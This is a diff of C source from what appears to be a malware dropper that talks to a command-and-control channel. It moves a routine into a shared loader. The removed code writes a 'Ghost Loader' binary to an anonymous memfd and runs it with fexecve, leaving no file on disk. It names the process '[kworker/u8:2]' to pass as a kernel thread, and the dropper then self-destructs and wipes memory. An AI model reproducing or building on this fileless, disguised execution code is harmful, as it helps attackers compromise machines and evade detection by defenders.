@@ -29,12 +29,12 @@
 #include "../c2_comms/crypto.h"
 #include "../common/config.h"
 #include "../common/logging.h"
+#include "../common/loader.h"
 #include "anti_analysis.h"
 
 
 #include <errno.h>
 #include <fcntl.h>
-#include <linux/memfd.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -112,79 +112,6 @@ static void self_destruct(void) {
        * our entry — less suspicious than a modified history file */
     }
   }
-}
-
-/* ── Internal: memfd_create wrapper ──────────────────────────────────────── */
-
-/*
- * Create an anonymous file in memory via memfd_create.
- * This gives us a file descriptor backed only by RAM — no disk footprint.
- * The name we give it mimics a legitimate-looking process.
- */
-static int create_memfd(const char *name) {
-  return (int)syscall(SYS_memfd_create, name, MFD_CLOEXEC);
-}
-
-/* ── Internal: Execute from memory ───────────────────────────────────────── */
-
-/*
- * Write binary data to a memfd and execute it via fexecve.
- * The binary runs in-memory — it never exists on disk.
- */
-static aegis_result_t exec_from_memory(const uint8_t *binary, size_t len) {
-  /* Create a memfd with a legitimate-looking name */
-  int memfd = create_memfd("[kworker/u8:2]");
-  if (memfd < 0)
-    return AEGIS_ERR_MMAP;
-
-  /* Write the Ghost Loader binary to the memfd */
-  size_t written = 0;
-  while (written < len) {
-    ssize_t n = write(memfd, binary + written, len - written);
-    if (n < 0) {
-      close(memfd);
-      return AEGIS_ERR_SYSCALL;
-    }
-    written += (size_t)n;
-  }
-
-  /* Seek back to the beginning */
-  lseek(memfd, 0, SEEK_SET);
-
-  /* Make it executable */
-  char fd_path[64];
-  snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", memfd);
-
-  /*
-   * Fork and exec: the child executes the Ghost Loader from memory.
-   * The parent self-destructs.
-   *
-   * We use fexecve() which executes directly from a file descriptor,
-   * never touching the filesystem.
-   */
-  pid_t child = fork();
-  if (child < 0) {
-    close(memfd);
-    return AEGIS_ERR_SYSCALL;
-  }
-
-  if (child == 0) {
-    /* Child: execute the Ghost Loader from memfd */
-    char *argv[] = {"[kworker/u8:2]", NULL};
-    char *envp[] = {NULL};
-
-    fexecve(memfd, argv, envp);
-
-    /* If fexecve fails, try execve via /proc/self/fd */
-    execve(fd_path, argv, envp);
-
-    /* Last resort: should never reach here */
-    _exit(127);
-  }
-
-  /* Parent: close memfd (child has its own copy) and self-destruct */
-  close(memfd);
-  return AEGIS_OK;
 }
 
 /* ── Main Entry Point ────────────────────────────────────────────────────── */
@@ -270,7 +197,7 @@ int main(int argc, char *argv[]) {
    * The Ghost Loader appears as a kernel worker thread
    * ("[kworker/u8:2]") in the process listing.
    */
-  rc = exec_from_memory(ghost_loader, ghost_len);
+  rc = aegis_exec_from_memory(ghost_loader, ghost_len, "[kworker/u8:2]", NULL, NULL);
 
   /* Securely wipe the Ghost Loader from our memory */
   AEGIS_WIPE(ghost_loader, ghost_len, 3);
